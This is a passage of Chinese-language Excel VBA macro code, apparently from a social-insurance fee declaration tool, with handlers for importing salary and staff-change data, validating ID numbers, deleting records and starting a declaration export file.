    .Columns("S:U").NumberFormatLocal = "G/通用格式"
    
    .Columns("X:Z").NumberFormatLocal = "G/通用格式"
    
    .Columns("AC:AE").NumberFormatLocal = "G/通用格式"
    
    .Columns("AH:AJ").NumberFormatLocal = "G/通用格式"
   
    .Columns("AM:AO").NumberFormatLocal = "G/通用格式"
    
    .Columns("AR:AT").NumberFormatLocal = "G/通用格式"
   
    .Columns("Ay:Ay").NumberFormatLocal = "G/通用格式"
   End With
       
         
                   
       Sheets("主页").Select
       
       
   
    ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("个人明细").Protect  '恢复保护工作表
     ActiveSheet.Protect  '保护工作表
     Sheets("历史数据").Protect  '恢复保护工作表
     Application.EnableEvents = True
     If Danwei = 0 And Renyuan = 0 And Jiaofei = 0 Then
        Exit Sub
     End If
    MsgBox ("初始化完成！")

    ThisWorkbook.Save
ErrorHandler:
End Sub


Private Sub 更新代码表_Click()
 Dim Fname, Bname As String '文件名
    Dim allDir As String
    Dim lie As Integer
    
    Dim i As Long

       
    allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改
     
     Fname = ThisWorkbook.Name
     Application.ScreenUpdating = False  '取消屏幕更新
    Sheets("代码表").Unprotect  '撤销保护工作表
     
          lie = Sheets("代码表").[a2].CurrentRegion.Columns.Count

     
  On Error GoTo ErrorHandler

     Bname = Application.GetOpenFilename   '打开并选择文件
     
     
    Workbooks.Open Bname  '打开目标文件（活动）
   
    'Bname = ActiveWorkbook.Name
    
    For i = 1 To lie
      If ThisWorkbook.Sheets("代码表").Cells(2, i) <> ActiveWorkbook.Sheets(1).Cells(2, i) Then
       MsgBox ("导入表格式不符!")
       Application.ScreenUpdating = True
       ActiveWorkbook.Close
       Exit Sub
      End If
    Next i
       
      
   
   ActiveWorkbook.Sheets(1).Range("3:65536").Copy
        
        ActiveSheet.Paste Destination:=ThisWorkbook.Sheets("代码表").Range("3:65536")
    
   Application.CutCopyMode = False
    ActiveWindow.Close
    ThisWorkbook.Sheets("主页").Select
    
   调代码表
       
  MsgBox "代码表已更新!"

ThisWorkbook.Save

   
ErrorHandler:
Application.ScreenUpdating = True '取消屏幕更新
Sheets("代码表").Protect  '撤销保护工作表

End Sub



Private Sub 减员_Click()
Dim nDate, nYear, nMonth As String
Dim nChoice As Variant '操作选项

 On Error GoTo ErrorHandler


If Renybj.Value = False Then

  MsgBox ("窗口未选为人员管理状态!")
  Exit Sub
End If

      If Sheet1.Cells(10, 3) = "" And Sheet1.Cells(10, 4) = "" Then
         MsgBox ("减谁啊?!")
      Exit Sub
      End If


If sj = 1 Then
  MsgBox ("这是缴费数据，不能进行减员操作!")
  Exit Sub
End If
 
If Sheets("个人明细").Cells(id_ms, 1) = "减员" Then
  MsgBox ("此人已被减员!")
  Exit Sub
End If


nChoice = MsgBox("确定减员吗？", 1, "社保费申报工具") '返回值确定1，取消2
      If nChoice = 2 Then
       Exit Sub
      End If
      
nYear = Trim(Str(ThisWorkbook.Sheets("主页").Cells(3, 5))) & "年"
nMonth = Str(ThisWorkbook.Sheets("主页").Cells(3, 6)) & "月"
nDate = nYear + nMonth

Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    Sheets("个人明细").Unprotect  '撤销保护工作表
    
     Sheets("个人明细").Cells(id_ms, 1) = "减员"
     Sheets("个人明细").Cells(id_ms, 19) = nDate

     Call 显示记录
    
     ThisWorkbook.Save
     
'ErrorHandler:                ' 错误处理程序。

    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("个人明细").Protect  '恢复保护工作表
    Sheets("主页").Select


ErrorHandler:

End Sub

Private Sub 进_Click()
id_ms = Sheets("主页").Cells(20, 3) + 3
id_ls = Sheets("主页").Cells(20, 3) + 3
Call 显示记录
End Sub

Private Sub 末_Click()
 Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表
    Sheets("主页").Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表

id_ms = Sheets("个人明细").[a2].CurrentRegion.Rows.Count
id_ls = Sheets("历史数据").[a2].CurrentRegion.Rows.Count
Call 显示记录
End Sub

Private Sub 导入工资_Click()
  Dim nFileName, sFz As String '文件名
    Dim nChoice As String '操作选项
    Dim i, j, IFerror, k As Long
   
    Dim allDir As String
    Dim iCount1, iCount2_q, iCount2, ls_end As Integer
    Dim Gzze As Single
    Dim Bili, Nn As Double
    
    If PM_mc(1) = "" Then
    调代码表
   End If
       
    allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改变默认路径
   
  On Error GoTo ErrorHandler
    '打开文件错误定义


    Application.ScreenUpdating = False
    '取消屏幕更新
    Application.EnableEvents = False '防误激发系统事件
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表

  
    nFileName = Application.GetOpenFilename(fileFilter:="excel表格 (*.xls), *.xls", Title:="请打开工资数据文件...")  '打开并选择申报文件
    Workbooks.Open nFileName  '打开目标文件（活动）
     
    iCount1 = ActiveWorkbook.Sheets("sheet1").[b1].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值
    iCount2 = ThisWorkbook.Sheets("个人明细").[a1].CurrentRegion.Rows.Count   '20070716 yh update
    
    nYear = Trim(Str(ThisWorkbook.Sheets("主页").Cells(3, 5))) & "年"
    nMonth = Str(ThisWorkbook.Sheets("主页").Cells(3, 6)) & "月"
    nDate = nYear + nMonth
    
     ActiveWorkbook.Sheets(1).Cells.Select
    Selection.Interior.ColorIndex = xlNone
    Selection.Replace What:=" ", Replacement:="", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False
'删除空格
    
    For i = 1 To 4
    If InStr("姓名身份证号码工资总额序号", ActiveWorkbook.Sheets(1).Cells(1, i)) = 0 Or ActiveWorkbook.Sheets(1).Cells(1, i) = "" Then
      MsgBox ("选定导入的文件格式不符...")
      Exit Sub
    End If
    Next i
        
'检查格式
     
   
IFerror = 0
k = 0
    For i = 2 To iCount1
        For j = 3 To iCount2
        k = k + 1
           If ThisWorkbook.Sheets("个人明细").Cells(j, 3) = ActiveWorkbook.Sheets("sheet1").Cells(i, 2) And ThisWorkbook.Sheets("个人明细").Cells(j, 4) = ActiveWorkbook.Sheets("Sheet1").Cells(i, 3) And ActiveWorkbook.Sheets("sheet1").Cells(i, 1) <> "ok!" Then
           ThisWorkbook.Sheets("个人明细").Cells(j, 11) = ActiveWorkbook.Sheets(1).Cells(i, 4)
           ActiveWorkbook.Sheets(1).Cells(i, 1) = "ok!"
            End If
    Bili = k / (iCount1 - 1) / (iCount2 - 2) * 100
    Application.StatusBar = "正在更新工资....." & Trim(Str(Int(Bili))) & "%"
    
         Next j
        
    If ActiveWorkbook.Sheets(1).Cells(i, 1) <> "ok!" Then
    IFerror = IFerror + 1
    End If
    
    Next i
    
    
If IFerror = 0 Then
   ActiveWorkbook.Save
   ActiveWorkbook.Close
End If
    
  
ThisWorkbook.Save

  
     MsgBox ("工资更新完成！")
   
    
ErrorHandler:
Application.EnableEvents = True '防误激发系统事件
Application.ScreenUpdating = True
Application.StatusBar = False


End Sub

Private Sub 批量增减员_Click()
    Dim nFileName, sFz As String '文件名
    Dim nChoice As String '操作选项
    Dim i, j, k, m, jianC, Zyuan, Jyuan, Yru, Zok, Jok, Yok, IFok As Long
    
    Dim Cunzai As Boolean
    Dim IFerror As Long
    Dim allDir As String
    Dim iCount1, iCount2_q, iCount2, ls_end As Integer
    Dim Aa(10), Bb(7) As String
    Dim Gzze As Double
    
    Dim Bili, Nn As Double
    
      
    '   Application.StatusBar = False
    

   
   If PM_mc(1) = "" Then
    调代码表
   End If
       
    allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改变默认路径
   
  On Error GoTo ErrorHandler
    '打开文件错误定义


    Application.ScreenUpdating = False
    '取消屏幕更新
    Application.EnableEvents = False '防误激发系统事件
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表

  
    nFileName = Application.GetOpenFilename(fileFilter:="excel表格 (*.xls), *.xls", Title:="请打开增减员导入源文件...")  '打开并选择申报文件
    Workbooks.Open nFileName  '打开目标文件（活动）
     
    iCount1 = ActiveWorkbook.Sheets("sheet1").[b1].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值
    iCount2 = ThisWorkbook.Sheets("个人明细").[a1].CurrentRegion.Rows.Count   '20070716 yh update
    
    nYear = Trim(Str(ThisWorkbook.Sheets("主页").Cells(3, 5))) & "年"
    nMonth = Str(ThisWorkbook.Sheets("主页").Cells(3, 6)) & "月"
    nDate = nYear + nMonth

     
     For i = 1 To 22
        If ActiveWorkbook.Sheets(1).Cells(1, i) <> ThisWorkbook.Sheets("人员导入表式").Cells(1, i) Then
            MsgBox ("选定导入的文件格式不符...")
            ActiveWorkbook.Close
        Exit Sub
        End If
    Next i
      If iCount1 < 2 Then
        MsgBox ("源表中未有个人信息资料")
        ActiveWorkbook.Close
        Exit Sub '返回
    End If
    
    
        ActiveWorkbook.Sheets(1).Range("a:u").Select
       ' ActiveWorkbook.Ranges("m:u").Select
    
   Selection.NumberFormatLocal = "@"
     ActiveWorkbook.Sheets(1).Range("l:l").Select
    Selection.NumberFormatLocal = "0.00_ ;[红色]-0.00 "
     ActiveWorkbook.Sheets(1).Range("A:A").Select
    Selection.NumberFormatLocal = "G/通用格式"
 
    
    ActiveWorkbook.Sheets(1).Cells.Select
    'Range("H1").Activate
    Selection.Font.ColorIndex = 0
    Selection.Interior.ColorIndex = xlNone
    
    
    
    ActiveWorkbook.Sheets(1).Cells.Select
    Selection.Interior.ColorIndex = xlNone
    Selection.Replace What:=" ", Replacement:="", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False
    
    
    
   ' 个人明细的格式（大集中系统导出）
   '序号    变动类型    姓名    身份证号码  身份证明类别    性别    个人社保号  户籍类型    用工形式    人员类别    人员状态    检查状态
  
    'MsgBox iCount
    '数据检测
       
    
    
    '检测结束
    
       
    
    If iCount1 >= 2 Then
       nChoice = MsgBox("开始进行增减员导入,请确认！", 1, "社保费申报工具")   '返回值确定1，取消2
         If nChoice = 2 Then
         Exit Sub
         End If
    End If
      Application.StatusBar = "正在导入增减员...."
           
   If nChoice = 1 Then
    Zyuan = 0
    Jyuan = 0
    Yru = 0
    Zok = 0
    Jok = 0
    Yok = 0
    nChoice = MsgBox("是否检验身份证号码?点取消则不检验身份证号码!", 1, "社保费申报工具")   '返回值确定1，取消2
    IFok = 1
 
    For i = 2 To iCount1
     IFerror = 0
    For j = 1 To 10
    Aa(j) = ""
    If j < 8 Then
    Bb(j) = ""
    End If
    Next j
   
   If InStr("增员减员正常012", ActiveWorkbook.Sheets(1).Cells(i, 2)) = 0 Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "" Then
   
     If ActiveWorkbook.Sheets(1).Cells(i, 2) = "" Then
    ActiveWorkbook.Sheets(1).Cells(i, 2) = "?"
    End If
    ActiveWorkbook.Sheets(1).Cells(i, 2).Font.ColorIndex = 3

    IFerror = IFerror + 1
    IFok = IFok * 0
    End If
    
             
    
    If (ActiveWorkbook.Sheets(1).Cells(i, 2) = "减员" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "2") And ActiveWorkbook.Sheets(1).Cells(i, 1) <> "ok!" Then
       Jyuan = Jyuan + 1
       For j = 3 To iCount2
           If ActiveWorkbook.Sheets(1).Cells(i, 3) = ThisWorkbook.Sheets("个人明细").Cells(j, 3) And ActiveWorkbook.Sheets(1).Cells(i, 4) = ThisWorkbook.Sheets("个人明细").Cells(j, 4) Then
          ThisWorkbook.Sheets("个人明细").Cells(j, 1) = "减员"
          ThisWorkbook.Sheets("个人明细").Cells(j, 19) = nDate
          ActiveWorkbook.Sheets(1).Cells(i, 1) = "ok!"
          Jok = Jok + 1
          
        Exit For
        End If
        Next j
    End If
    
     If (ActiveWorkbook.Sheets(1).Cells(i, 2) = "增员" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "1" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "正常" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "0") And ActiveWorkbook.Sheets(1).Cells(i, 1) <> "ok!" Then
          
          
          
          If ActiveWorkbook.Sheets(1).Cells(i, 2) = "增员" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "1" Then
            Zyuan = Zyuan + 1
            Else
            Yru = Yru + 1
          End If
          
           
        For j = 1 To 10
             If ActiveWorkbook.Sheets(1).Cells(i, 2) = MandD(j, 13) Or ActiveWorkbook.Sheets(1).Cells(i, 2) = MandD(j, 14) Then
               Aa(1) = MandD(j, 14)
               'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 1) = MandD(j, 14)
               Exit For
              End If
        Next j
        
        If Aa(1) = "" Then
           IFerror = IFerror + 1
           IFok = IFok * 0
            ActiveWorkbook.Sheets(1).Cells(i, 2).Font.ColorIndex = 3
        End If
                    
        Aa(3) = ActiveWorkbook.Sheets(1).Cells(i, 3)
            If Aa(3) = "" Then
           IFerror = IFerror + 1
           IFok = IFok * 0
            ActiveWorkbook.Sheets(1).Cells(i, 3).Font.ColorIndex = 3
            ActiveWorkbook.Sheets(1).Cells(i, 3) = "?"
        End If
               
        '加是否检测身份证
          Select Case nChoice
          
        Case 1
        
                
        ActiveWorkbook.Sheets(1).Cells(i, 7) = SfzHjc(ActiveWorkbook.Sheets(1).Cells(i, 4))
        If ActiveWorkbook.Sheets(1).Cells(i, 7) <> "" Then
          IFerror = IFerror + 1
          IFok = IFok * 0
          ActiveWorkbook.Sheets(1).Cells(i, 4).Font.ColorIndex = 3
        Else
        Aa(2) = ActiveWorkbook.Sheets(1).Cells(i, 4)
        Aa(4) = ActiveWorkbook.Sheets(1).Cells(i, 4)
        End If
        
        
        
        Case 2
        
        If ActiveWorkbook.Sheets(1).Cells(i, 7) = "" Then
            ActiveWorkbook.Sheets(1).Cells(i, 7) = "?"
            ActiveWorkbook.Sheets(1).Cells(i, 7).Font.ColorIndex = 3
            IFerror = IFerror + 1
            IFok = IFok * 0
        Else

        Aa(2) = ActiveWorkbook.Sheets(1).Cells(i, 7)
        Aa(4) = ActiveWorkbook.Sheets(1).Cells(i, 4)
        End If
        End Select
          
        If ActiveWorkbook.Sheets(1).Cells(i, 7) = "" And nChoice = 1 Then
 
        sFz = ActiveWorkbook.Sheets(1).Cells(i, 4)
          If Len(sFz) = 18 Then
             Nn = Mid(sFz, 17, 1)
          ElseIf Len(ActiveWorkbook.Sheets(1).Cells(i, 4)) = 15 Then
             Nn = Mid(sFz, 15, 1)
          End If

            If Int(Nn / 2) = Nn / 2 And (ActiveWorkbook.Sheets(1).Cells(i, 6) = "0" Or ActiveWorkbook.Sheets(1).Cells(i, 6) = "男") Then
            
               IFerror = IFerror + 1
               IFok = IFok * 0
              ActiveWorkbook.Sheets(1).Cells(i, 6).Font.ColorIndex = 3
            ElseIf Int(Nn / 2) <> Nn / 2 And (ActiveWorkbook.Sheets(1).Cells(i, 6) = "1" Or ActiveWorkbook.Sheets(1).Cells(i, 6) = "女") Then
                 IFerror = IFerror + 1
                 IFok = IFok * 0
              ActiveWorkbook.Sheets(1).Cells(i, 6).Font.ColorIndex = 3
            End If
        End If
      
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 2) = ActiveWorkbook.Sheets(1).Cells(i, 4)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 3) = ActiveWorkbook.Sheets(1).Cells(i, 3)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 4) = ActiveWorkbook.Sheets(1).Cells(i, 4)
      
      For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 5) = MandD(j, 1) Or ActiveWorkbook.Sheets(1).Cells(i, 5) = MandD(j, 2) Then
             Aa(5) = MandD(j, 2)
             'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 5) = MandD(j, 2)
             Exit For
         End If
      Next j
          If Aa(5) = "" Then
              If ActiveWorkbook.Sheets(1).Cells(i, 5) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 5) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 5).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
           End If
          
     '身份证
     
      
       For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 6) = MandD(j, 3) Or ActiveWorkbook.Sheets(1).Cells(i, 6) = MandD(j, 4) Then
            Aa(6) = MandD(j, 4)
            'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 6) = MandD(j, 4)
         Exit For
         End If
      Next j
      
      If Aa(6) = "" Then
              If ActiveWorkbook.Sheets(1).Cells(i, 6) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 6) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 6).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
             
           End If
      '性别
      
      For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 10) = MandD(j, 5) Or ActiveWorkbook.Sheets(1).Cells(i, 10) = MandD(j, 6) Then
            Aa(7) = MandD(j, 6)
            'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 7) = MandD(j, 6)
         Exit For
         End If
      Next j
           If Aa(7) = "" Then
             If ActiveWorkbook.Sheets(1).Cells(i, 10) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 10) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 10).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
           End If
      
       For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 9) = MandD(j, 7) Or ActiveWorkbook.Sheets(1).Cells(i, 9) = MandD(j, 8) Then
            Aa(8) = MandD(j, 8)
            'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 8) = MandD(j, 8)
         Exit For
         End If
      Next j
            If Aa(8) = "" Then
            
            If ActiveWorkbook.Sheets(1).Cells(i, 9) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 9) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 9).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
             
           End If
      
      For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 8) = MandD(j, 9) Or ActiveWorkbook.Sheets(1).Cells(i, 8) = MandD(j, 10) Then
            Aa(9) = MandD(j, 10)
            'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 9) = MandD(j, 10)
         Exit For
         End If
      Next j
      
        If Aa(9) = "" Then
        
             If ActiveWorkbook.Sheets(1).Cells(i, 8) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 8) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 8).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
           End If
      
      
      For j = 1 To 10
         If ActiveWorkbook.Sheets(1).Cells(i, 11) = MandD(j, 11) Or ActiveWorkbook.Sheets(1).Cells(i, 11) = MandD(j, 12) Then
            Aa(10) = MandD(j, 12)
            'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 10) = MandD(j, 12)
         Exit For
         End If
      Next j
           If Aa(10) = "" Then
           
           If ActiveWorkbook.Sheets(1).Cells(i, 11) = "" Then
                ActiveWorkbook.Sheets(1).Cells(i, 11) = "?"
              End If
             ActiveWorkbook.Sheets(1).Cells(i, 11).Font.ColorIndex = 3
             IFerror = IFerror + 1
             IFok = IFok * 0
           End If
       '到此开始
       
       
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 11) = ActiveWorkbook.Sheets(1).Cells(i, 12)
           
      If ActiveWorkbook.Sheets(1).Cells(i, 12) = "" Then
       Gzze = 0
       Else
        Gzze = ActiveWorkbook.Sheets(1).Cells(i, 12)
       End If
      
     For k = 13 To 19
       For j = 1 To 50
         If ActiveWorkbook.Sheets(1).Cells(i, k) = "" Then
         Exit For
         End If
       
         If PM_dm(j) = "" Then
         ActiveWorkbook.Sheets(1).Cells(i, k).Font.ColorIndex = 3
         IFerror = IFerror + 1
         IFok = IFok * 0

           Exit For
         End If
        If ActiveWorkbook.Sheets(1).Cells(i, k) = PM_mc(j) Or ActiveWorkbook.Sheets(1).Cells(i, k) = PM_dm(j) Then
            If (Sy(j) = Aa(10) Or (Sy(j) = "" And Aa(10) <> "离休")) And Flei(j) = k - 12 Then
            Bb(k - 12) = PM_dm(j)
            End If
             If Bb(k - 12) = "" Then
              ActiveWorkbook.Sheets(1).Cells(i, k).Font.ColorIndex = 5
              IFerror = IFerror + 1
               IFok = IFok * 0
             End If
            Exit For
                        
        End If
       Next j
      
       Next k
          
      
     End If
     
     
          
           If IFerror = 0 And ActiveWorkbook.Sheets(1).Cells(i, 1) <> "ok!" Then
          iCount2 = ThisWorkbook.Sheets("个人明细").[a1].CurrentRegion.Rows.Count
          ActiveWorkbook.Sheets(1).Cells(i, 1) = "ok!"

             
              For j = 1 To 10
               ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, j) = Aa(j)
              Next j
              
             ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, 11) = Gzze
             
             For j = 12 To 18
                  ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, j) = Bb(j - 11)
             Next j
        
           
      
      
        
           
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 12) = ActiveWorkbook.Sheets(1).Cells(i, 13)
      
      
      
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 13) = ActiveWorkbook.Sheets(1).Cells(i, 14)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 14) = ActiveWorkbook.Sheets(1).Cells(i, 15)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 15) = ActiveWorkbook.Sheets(1).Cells(i, 16)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 16) = ActiveWorkbook.Sheets(1).Cells(i, 17)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 17) = ActiveWorkbook.Sheets(1).Cells(i, 18)
      'ThisWorkbook.Sheets("个人明细").Cells(iCount2 + i - 1, 18) = ActiveWorkbook.Sheets(1).Cells(i, 19)
      
      
      ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, 19) = nDate
      ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, 22) = ActiveWorkbook.Sheets(1).Cells(i, 20)
      ThisWorkbook.Sheets("个人明细").Cells(iCount2 + 1, 23) = ActiveWorkbook.Sheets(1).Cells(i, 21)
                  If ActiveWorkbook.Sheets(1).Cells(i, 2) = "增员" Or ActiveWorkbook.Sheets(1).Cells(i, 2) = "1" Then
                      Zok = Zok + 1
                   Else
                      Yok = Yok + 1
                  End If
      
      
        End If
     Bili = (i - 1) / (iCount1 - 1) * 100
     Application.StatusBar = "正在导入增减员...." & Trim(Str(Int(Bili))) & "%"
    Next i
    End If
    If IFok = 1 Then
    'If Zyuan = Zok And Jyuan = Jok And Yru = Yok Then
      ActiveWorkbook.Save
      ActiveWorkbook.Close
    Else
      ActiveWorkbook.Save
     End If
        
    ThisWorkbook.Save
    '保存当前工作簿
    MsgBox "导入完成！如导入源表未关闭，请检查修改后重导未成功的数据。。。"
ErrorHandler:
     Application.StatusBar = False
     Application.EnableEvents = True '恢复激发系统事件
    Application.ScreenUpdating = True '恢复屏幕更新
    'Application.EnableEvents = True
   
    ThisWorkbook.Sheets("个人明细").Protect  '恢复保护工作表
End Sub
    
Private Sub 清空_Click()
Dim i As Integer   '定义用于循环的整型变量
'Dim j As Integer   '定义用于循环的整型变量
'定义用于保存“读者信息”记录数的整型变量
Dim iCount As Integer
'定义判断记录是否在的布尔变量
Dim Cunzai, nMsg As Boolean
'Dim sbh, name, number As String '定义个人社保号、姓名、身份证号
Dim nChoice As Variant '操作选项
'Dim tData(120) As Variant '临时数组 更新月快报表显示 2005-07-21 Y.H.update

 If PM_dm(1) = "" Then
         调代码表
        End If
   If xs <> 1 Then
    q = 3
   End If

        Application.EnableEvents = False


    Application.ScreenUpdating = False
    '取消屏幕更新

       Sheets("主页").Select
       Sheets("主页").Unprotect  '撤销保护工作表

       
      Sheets("主页").Range("A10:K10").ClearContents
       Sheets("主页").Unprotect  '撤销保护工作表
      Sheets("主页").Range("b13:i19,k13,k15,k17").ClearContents
     If Renybj.Value = True Then
      Sheets("主页").Cells(16, 11) = "变动时间"
      Else
      Sheets("主页").Cells(16, 11) = "缴费所属期"
      End If
      
      
      
                   
       Sheets("主页").Select
       'MsgBox "已清空..."  '弹出提示数据删除成功的信息
       
    
        ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
    ThisWorkbook.Sheets("主页").Protect  '恢复保护工作表
             
    Application.EnableEvents = True

    
End Sub

Private Sub 删除_Click()
   Dim nChoice As String '操作选项
   Dim i As Long
      On Error GoTo aaaaa
      
      
      If Sheets("个人明细").Cells(id_ms, 3) <> Sheets("主页").Cells(10, 3) Or Sheets("个人明细").Cells(id_ms, 4) <> Sheets("主页").Cells(10, 4) Then
      Exit Sub
      End If
      
    
     
     nChoice = MsgBox("真的删除" + Trim(Sheets("个人明细").Cells(id_ms, 3)) + "吗?,请确认...", 1, "社保费申报工具") '返回值确定1，取消2
         If nChoice = 2 Then
         Exit Sub
         End If
    
     Application.ScreenUpdating = False
    '取消屏幕更新

      'Sheets("个人明细").Select
       Sheets("个人明细").Unprotect  '撤销保护工作表
       
              
      
       
      Sheets("个人明细").Rows(id_ms).Delete
       
       Sheets("个人明细").Protect
       Sheets("主页").Select
        Application.ScreenUpdating = True
        
     Call 显示记录
     
             
aaaaa:
End Sub

Private Sub 社保费申报_Click()
    Dim nFileName  As String '文件名
    'Dim nChoice As String '操作选项
    Dim i, j, k, L, m, s, Js, js_1, dm, dm_1, h, zeng, jian, u, D_riqi, J_riqi, Hang As Integer
'  Dim lData(10000, 12) As Variant
    Dim allDir As String
    Dim iCount, iCount1 As Integer
    Dim wb As Object
    Dim ls_data As String
    Dim t_number As Integer '作为每个参保人的第
    Dim Bili As Double
    Dim nChoice As Variant '操作选项
    Dim newbook As Object
    Dim Appobj As Object
    ' Application.StatusBar = ""
    
     If PM_mc(1) = "" Then
    调代码表
    End If
    
          
    sb_mode = ""
    Uf_ts.Show
    If Uf_ts.sb_s.Value = True Then
        sb_mode = "上门申报"
    End If
    If Uf_ts.sb_w.Value = True Then
       sb_mode = "网上申报"
    End If
    
    
      
    If sb_mode = "" Then
    MsgBox "未选择申报方式,请重新申报..."
    Exit Sub
    End If
     nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年" '年
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月" '月
    Shenbq.Show
    
    If Shenbq.rh.Value = "" Then
    Exit Sub
    End If
    
    nDate = Shenbq.rh + "年 " + Shenbq.ee.Value + "月"
    
        
    allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改变默认路径
    'MsgBox CurDir()
     Application.EnableEvents = False
     Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
  
   
     Sheets("历史数据").Unprotect  '撤销保护工作表
       
     
   
       
   Application.StatusBar = "正在导出报盘文件....."
   
    nFileName = sb_mode + "社保缴费" + Trim(nDate) + Trim(Sheets("主页").Cells(5, 3)) + ".xls"
    
   
   
   iCount = ThisWorkbook.Sheets("历史数据").[a1].CurrentRegion.Rows.Count
    
  

    Set newbook = Workbooks.Add  '新增文件


    'Workbooks.Open Filename:=nFileName
    '选择源数据区
    '设置列文本属性
    
    ActiveWorkbook.Sheets(1).Columns("A:R").Select
    Selection.NumberFormatLocal = "@"
    
   
        k = 2  'k为记录指针
        s = 0  'm为在职人员
        m = 0  'm为退休人员
    If sb_mode = "网上申报" Then
       
            '磁盘申报格式：网上申报-最大允许5笔记录
            '姓名    身份证明号码    个人社保号  工资薪金    征收品目    计费金额    征收品目    计费金额  征收品目    计费金额    征收品目    计费金额 征收品目    计费金额
            ActiveWorkbook.Sheets(1).Cells(1, 1) = "姓名"
            ActiveWorkbook.Sheets(1).Cells(1, 2) = "身份证明号码"
            ActiveWorkbook.Sheets(1).Cells(1, 3) = "个人社保号 "
            ActiveWorkbook.Sheets(1).Cells(1, 4) = "工资薪金"
            ActiveWorkbook.Sheets(1).Cells(1, 5) = "征收品目"
            ActiveWorkbook.Sheets(1).Cells(1, 6) = "计费金额"
            ActiveWorkbook.Sheets(1).Cells(1, 7) = "征收品目"
            ActiveWorkbook.Sheets(1).Cells(1, 8) = "计费金额"
            ActiveWorkbook.Sheets(1).Cells(1, 9) = "征收品目"
            ActiveWorkbook.Sheets(1).Cells(1, 10) = "计费金额"
            ActiveWorkbook.Sheets(1).Cells(1, 11) = "征收品目"
            ActiveWorkbook.Sheets(1).Cells(1, 12) = "计费金额"
            ActiveWorkbook.Sheets(1).Cells(1, 13) = "征收品目"
            ActiveWorkbook.Sheets(1).Cells(1, 14) = "计费金额"
